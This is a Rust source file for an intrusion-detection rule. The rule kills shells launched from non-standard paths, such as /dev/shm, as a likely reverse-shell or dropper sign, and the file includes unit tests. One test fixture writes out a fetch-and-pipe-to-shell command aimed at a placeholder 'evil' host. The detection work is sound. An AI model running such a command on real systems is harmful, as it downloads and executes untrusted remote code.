//! R017 — Interactive shell binary from a non-standard path (Tappa
//! 10.5 D2).
//!
//! MITRE T1059.004 (Command and Scripting Interpreter: Unix Shell).
//! Extends the R001–R003 staging-path family: a shell whose `comm` is
//! `sh`/`bash`/`dash` but whose `filename` is NOT under `/bin` or
//! `/usr/bin` is a copied/renamed shell in an odd location — a
//! reverse-shell / dropper shape. Design §7.1: comm ∈ {sh, bash,
//! dash} & filename ∉ {/bin, /usr/bin}, gated by the path-derived
//! check + `process-comm-allowlist`.
//!
//! Note on ordering: R001–R010 evaluate first, so a shell under a
//! staging path already covered by those rules (e.g. `/tmp/bash`
//! → R001) is attributed there; R017 catches the residual cases
//! (e.g. `/opt/evil/sh`, `/dev/shm/dash`) not covered by a
//! path-specific Tappa 2 rule.

use std::sync::Arc;

use common::{Event, ResponseAction, Severity, Verdict};

use crate::config::comm_allowlist::CommAllowlist;
use crate::decision::{rules::build_verdict, Rule};

/// Interactive shell comms (design §7.1).
const SHELL_COMMS: &[&str] = &["sh", "bash", "dash"];

/// The only directories a system shell legitimately lives in per the
/// design §7.1 trigger. A shell `comm` from anywhere else is flagged.
const SHELL_STD_PREFIXES: &[&str] = &["/bin/", "/usr/bin/"];

pub struct R017ShellFromNonstandardPath {
    allowlist: Arc<CommAllowlist>,
}

impl R017ShellFromNonstandardPath {
    pub fn new(allowlist: Arc<CommAllowlist>) -> Self {
        Self { allowlist }
    }
}

impl Rule for R017ShellFromNonstandardPath {
    fn id(&self) -> &'static str {
        "R017_ShellFromNonstandardPath"
    }
    fn name(&self) -> &'static str {
        "Shell binary from non-standard path"
    }
    fn category(&self) -> &'static str {
        "execution"
    }

    fn evaluate(&self, event: &Event) -> Option<Verdict> {
        let Event::ProcessSpawn {
            comm,
            filename,
            argv,
            parent_comm,
            ..
        } = event
        else {
            return None;
        };
        if !SHELL_COMMS.contains(&comm.as_str()) {
            return None;
        }
        if SHELL_STD_PREFIXES.iter().any(|p| filename.starts_with(p)) {
            return None;
        }
        if self.allowlist.contains(comm) {
            return None;
        }
        // D5: `-c <payload>` is inline command exec (the reverse-shell
        // one-liner shape); parent_comm gives provenance context (§5.2 —
        // sshd-spawned vs cron/nginx-spawned). Both additive.
        let mut reasoning = String::from(
            "Interactive shell (sh/bash/dash) exec from a non-standard \
             path — copied/renamed shell / reverse-shell shape \
             (T1059.004); posture → ENGAGED",
        );
        if let Some(idx) = argv.iter().position(|a| a == "-c") {
            if let Some(payload) = argv.get(idx + 1) {
                reasoning = format!("{reasoning} — inline command (-c): {payload}");
            } else {
                reasoning = format!("{reasoning} — inline -c command");
            }
        }
        if !parent_comm.is_empty() {
            reasoning = format!("{reasoning}; spawned by {parent_comm}");
        }
        Some(build_verdict(
            self,
            event,
            ResponseAction::KillProcess,
            Severity::High,
            &reasoning,
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::decision::rules::testutil::{spawn, spawn_full};

    fn rule() -> R017ShellFromNonstandardPath {
        R017ShellFromNonstandardPath::new(Arc::new(CommAllowlist::default()))
    }

    #[test]
    fn fires_on_shell_from_nonstandard_path() {
        for path in ["/opt/evil/sh", "/dev/shm/bash", "/srv/x/dash"] {
            let comm = path.rsplit('/').next().unwrap();
            let v = rule()
                .evaluate(&spawn(comm, path))
                .unwrap_or_else(|| panic!("should fire on {path}"));
            assert_eq!(v.rule_id, "R017_ShellFromNonstandardPath");
            assert_eq!(v.action, ResponseAction::KillProcess);
            assert_eq!(v.severity, Severity::High);
        }
    }

    #[test]
    fn argv_inline_command_and_parent_enrich_reasoning() {
        let ev = spawn_full(
            "sh",
            "/dev/shm/sh",
            1000,
            &["sh", "-c", "curl http://evil|sh"],
            "sshd",
        );
        let v = rule().evaluate(&ev).expect("fires");
        assert_eq!(v.severity, Severity::High); // base preserved
        assert!(v
            .reasoning
            .contains("inline command (-c): curl http://evil|sh"));
        assert!(v.reasoning.contains("spawned by sshd"));
    }

    #[test]
    fn fires_without_argv_graceful_degrade() {
        let v = rule()
            .evaluate(&spawn("bash", "/dev/shm/bash"))
            .expect("fires");
        assert!(!v.reasoning.contains("inline command"));
        assert!(!v.reasoning.contains("spawned by"));
    }

    #[test]
    fn ignores_shell_from_standard_path() {
        assert!(rule().evaluate(&spawn("bash", "/bin/bash")).is_none());
        assert!(rule().evaluate(&spawn("sh", "/usr/bin/sh")).is_none());
        // A non-shell binary from a non-standard path is not R017's job.
        assert!(rule()
            .evaluate(&spawn("payload", "/opt/evil/payload"))
            .is_none());
    }

    #[test]
    fn allowlisted_comm_is_exempt() {
        let r = R017ShellFromNonstandardPath::new(Arc::new(CommAllowlist::from_iter_owned([
            "bash".to_string(),
        ])));
        assert!(r.evaluate(&spawn("bash", "/opt/tools/bash")).is_none());
        // A different shell comm not on the allowlist still fires.
        assert!(r.evaluate(&spawn("dash", "/opt/tools/dash")).is_some());
    }
}
